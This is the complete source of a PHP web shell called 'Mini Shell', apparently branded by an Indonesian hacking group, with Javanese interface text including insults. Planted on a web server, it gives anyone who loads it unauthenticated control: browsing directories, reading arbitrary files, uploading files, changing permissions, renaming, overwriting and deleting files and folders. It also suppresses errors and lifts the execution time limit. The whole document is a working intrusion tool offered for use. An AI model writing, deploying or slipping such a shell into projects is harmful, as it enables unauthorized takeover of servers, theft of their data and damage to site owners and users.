<?php

// --- Mini Shell

set_time_limit(0);

error_reporting(0);

if(get_magic_quotes_gpc()){

    foreach($_POST as $key=>$value){

        $_POST[$key] = stripslashes($value);

    }

}

echo '<!DOCTYPE HTML>

<HTML>

<HEAD>

<link href="https://fonts.googleapis.com/css?family=Lora|Allan|Baloo+Bhai" rel="stylesheet"> 

<title>:: ? ::</title>

<meta charset="utf-8">

<meta name="robots" content="all"/>

<meta name="viewport" content="width=device-width,initial-scale=1,shrink-to-fit=yes">

<meta property="og:title" content="Watisa Private Shell" /> 

<link href="https://1.top4top.net/p_1410i0kch0.jpg" rel="icon" type="image/x-icon" /><meta property="og:image" content="https://1.top4top.net/p_1410i0kch0.jpg" /> <meta property="og:description" content="Badan Siber Dan Sandi Watisa"/> <link rel="shortcut icon" href="https://1.top4top.net/p_1410i0kch0.jpg" type="image/x-icon" />

<link href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">

<style>

body{

    font-family: Baloo Bhai;

    background-color: #191919;

    color : #ffffff;

    text-shadow:0px 0px 1px #757575;

}

#content tr:hover{

    background-color: #191919;

    text-shadow:0px 0px 10px #fff;

}

#content .first{

    background-color: #191919;

}

h1{

  position: absolute center;

  margin: 5px;

  font-family: Allan;

  font-size: 50px;

  color: #F975F7 ;

  transform:rotate(-15deg);

  -ms-transform:rotate(-15deg); 

  -webkit-transform:rotate(-15deg); 

  margin-top: -45px;

  -webkit-text-stroke: 2px #f008b7;

  -webkit-filter: drop-shadow(2px 2px 20px #f008b7);

  z-index: 20;

padding-bottom:30px;

}

#content .first:hover{

    background-color: #191919;

    text-shadow:0px 0px 1px #757575;

}

table{

    border: 5px #ffffff inset;

    padding:25%;

     padding-top: 50px;

  padding-right: 30px;

  padding-bottom: 50px;

  padding-left: 80px;

}

a{

    color: #ffffff;

    text-decoration: none;

}

a:hover{

    color: #fff;

    text-shadow:0px 0px 10px #ffffff;

}

input,select,textarea{

    border: 1px #000000 solid;

    -moz-border-radius: 5px;

    -webkit-border-radius:5px;

    border-radius:5px;

}

.myButton{display: block;background-color: #000000;width: 100%;max-width: 250px;margin: auto;margin-top: 30px;padding:11px 1px 11px 10px;border-radius: 25px;font-size: 1em;color: White;font-weight: 700;border-bottom: 1px outset #DCDCDC;}

</style>

</HEAD>

<BODY>

<center>

<br />

<img src="https://1.top4top.net/p_1410i0kch0.jpg" height="250px" width="250px" /><h1> :: BSSW &hearts; <br /></h1><br />

<table width="75%" border="0" cellpadding="5" cellspacing="3" align="center">

<tr><td>Nggonmu Saiki : ';

if(isset($_GET['path'])){

    $path = $_GET['path'];   

}else{

    $path = getcwd();

}

$path = str_replace('\\','/',$path);

$paths = explode('/',$path);

foreach($paths as $id=>$pat){

    if($pat == '' && $id == 0){

        $a = true;

        echo '<a href="?path=/">/</a>';

        continue;

    }

    if($pat == '') continue;

    echo '<a href="?path=';

    for($i=0;$i<=$id;$i++){

        echo "$paths[$i]";

        if($i != $id) echo "/";

    }

    echo '">'.$pat.'</a>/';

}

echo '</td></tr><tr><td>';

if(isset($_FILES['file'])){

    if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){

        echo '<font color="green">Iso Nyet</font><br />';

    }else{

        echo '<font color="red">Modar Gagal</font><br />';

    }

}

echo '<form enctype="multipart/form-data" method="POST">

Ngaplot :<input type="file" name="file" />

<input type="submit" value="Gass Keun" />

</form>

</td></tr>';

if(isset($_GET['filesrc'])){

    echo "<tr><td>Current File : ";

    echo $_GET['filesrc'];

    echo '</tr></td></table><br />';

    echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre>');

}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){

    echo '</table><br /><center>'.$_POST['path'].'<br /><br />';

    if($_POST['opt'] == 'chmod'){

        if(isset($_POST['perm'])){

            if(chmod($_POST['path'],$_POST['perm'])){

                echo '<font color="green">Iso Ndes</font><br />';

            }else{

                echo '<font color="red">Pekok Koe Meh Nopo ?</font><br />';

            }

        }

        echo '<form method="POST">

        Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />

        <input type="hidden" name="path" value="'.$_POST['path'].'">

        <input type="hidden" name="opt" value="chmod"><br /><br />

        <input type="submit" class="myButton" value="Gasskeun" /><br /><br />

        </form>';

    }elseif($_POST['opt'] == 'rename'){

        if(isset($_POST['newname'])){

            if(rename($_POST['path'],$path.'/'.$_POST['newname'])){

                echo '<font color="green">Iso Njenengi Ndes</font><br />';

            }else{

                echo '<font color="red">Pekok Koe Asu !</font><br />';

            }

            $_POST['name'] = $_POST['newname'];

        }

        echo '<form method="POST">

        New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />

        <input type="hidden" name="path" value="'.$_POST['path'].'">

        <input type="hidden" name="opt" value="rename"><br /><br />

        <input type="submit" class="myButton" value="Gasskeun" /><br /><br />

        </form>';

    }elseif($_POST['opt'] == 'edit'){

        if(isset($_POST['src'])){

            $fp = fopen($_POST['path'],'w');

            if(fwrite($fp,$_POST['src'])){

                echo '<font color="green">Iso Ndes</font><br />';

            }else{

                echo '<font color="red">Goblok Koe, Celeng!</font><br />';

            }

            fclose($fp);

        }

        echo '<form method="POST">

        <textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />

        <input type="hidden" name="path" value="'.$_POST['path'].'">

        <input type="hidden" name="opt" value="edit"><br /><br />

        <input type="submit" class="myButton" value="Gasskeun" /><br /><br />

        </form>';

    }

    echo '</center>';

}else{

    echo '</table><br /><center>';

    if(isset($_GET['option']) && $_POST['opt'] == 'delete'){

        if($_POST['type'] == 'dir'){

            if(rmdir($_POST['path'])){

                echo '<font color="green">Delete Dir Done.</font><br />';

            }else{

                echo '<font color="red">Delete Dir Error.</font><br />';

            }

        }elseif($_POST['type'] == 'file'){

            if(unlink($_POST['path'])){

                echo '<font color="green">Delete File Done.</font><br />';

            }else{

                echo '<font color="red">Delete File Error.</font><br />';

            }

        }

    }

    echo '</center>';

    $scandir = scandir($path);

    echo '<div id="content"><table width="80%" border="0" cellpadding="5" cellspacing="3" align="center">

    <tr class="first">

        <td><center>Jenenge</center></td>

        <td><center>Bobote</center></td>

        <td><center>Ijen</center></td>

        <td><center>Pilehan</center></td>

    </tr>';

    foreach($scandir as $dir){

        if(!is_dir("$path/$dir") || $dir == '.' || $dir == '..') continue;

        echo "<tr>

        <td><a href=\"?path=$path/$dir\">$dir</a></td>

        <td><center>--</center></td>

        <td><center>";

        if(is_writable("$path/$dir")) echo '<font color="green">';

        elseif(!is_readable("$path/$dir")) echo '<font color="red">';

        echo perms("$path/$dir");

        if(is_writable("$path/$dir") || !is_readable("$path/$dir")) echo '</font>';

        

        echo "</center></td>

        <td><center><form method=\"POST\" action=\"?option&path=$path\">

        <select name=\"opt\">

	    <option value=\"\"></option>        <option value=\"delete\">Guwak</option>

        <option value=\"chmod\">Chmod</option>

        <option value=\"rename\">Njenengi</option>

        </select>

        <input type=\"hidden\" name=\"type\" value=\"dir\">

        <input type=\"hidden\" name=\"name\" value=\"$dir\">

        <input type=\"hidden\" name=\"path\" value=\"$path/$dir\">

        <input type=\"submit\" value=\">\" />

        </form></center></td>

        </tr>";

    }

    echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';

    foreach($scandir as $file){

        if(!is_file("$path/$file")) continue;

        $size = filesize("$path/$file")/1024;

        $size = round($size,3);

        if($size >= 1024){

            $size = round($size/1024,2).' MB';

        }else{

            $size = $size.' KB';

        }

        echo "<tr>

        <td><a href=\"?filesrc=$path/$file&path=$path\">$file</a></td>

        <td><center>".$size."</center></td>

        <td><center>";

        if(is_writable("$path/$file")) echo '<font color="green">';

        elseif(!is_readable("$path/$file")) echo '<font color="red">';

        echo perms("$path/$file");

        if(is_writable("$path/$file") || !is_readable("$path/$file")) echo '</font>';

        echo "</center></td>

        <td><center><form method=\"POST\" action=\"?option&path=$path\">

        <select name=\"opt\">

	    <option value=\"\"></option>

        <option value=\"delete\">Delete</option>

        <option value=\"chmod\">Chmod</option>

        <option value=\"rename\">Rename</option>

        <option value=\"edit\">Edit</option>

        </select>

        <input type=\"hidden\" name=\"type\" value=\"file\">

        <input type=\"hidden\" name=\"name\" value=\"$file\">

        <input type=\"hidden\" name=\"path\" value=\"$path/$file\">

        <input type=\"submit\" value=\">\" />

        </form></center></td>

        </tr>";

    }

    echo '</table>

    </div>';

}

echo '</BODY>

</HTML>';

function perms($file){

    $perms = fileperms($file);

if (($perms & 0xC000) == 0xC000) {

    // Socket

    $info = 's';

} elseif (($perms & 0xA000) == 0xA000) {

    // Symbolic Link

    $info = 'l';

} elseif (($perms & 0x8000) == 0x8000) {

    // Regular

    $info = '-';

} elseif (($perms & 0x6000) == 0x6000) {

    // Block special

    $info = 'b';

} elseif (($perms & 0x4000) == 0x4000) {

    // Directory

    $info = 'd';

} elseif (($perms & 0x2000) == 0x2000) {

    // Character special

    $info = 'c';

} elseif (($perms & 0x1000) == 0x1000) {

    // FIFO pipe

    $info = 'p';

} else {

    // Unknown

    $info = 'u';

}

// Owner

$info .= (($perms & 0x0100) ? 'r' : '-');

$info .= (($perms & 0x0080) ? 'w' : '-');

$info .= (($perms & 0x0040) ?

            (($perms & 0x0800) ? 's' : 'x' ) :

            (($perms & 0x0800) ? 'S' : '-'));

// Group

$info .= (($perms & 0x0020) ? 'r' : '-');

$info .= (($perms & 0x0010) ? 'w' : '-');

$info .= (($perms & 0x0008) ?

            (($perms & 0x0400) ? 's' : 'x' ) :

            (($perms & 0x0400) ? 'S' : '-'));

// World

$info .= (($perms & 0x0004) ? 'r' : '-');

$info .= (($perms & 0x0002) ? 'w' : '-');

$info .= (($perms & 0x0001) ?

            (($perms & 0x0200) ? 't' : 'x' ) :

            (($perms & 0x0200) ? 'T' : '-'));

    return $info;

}

?>
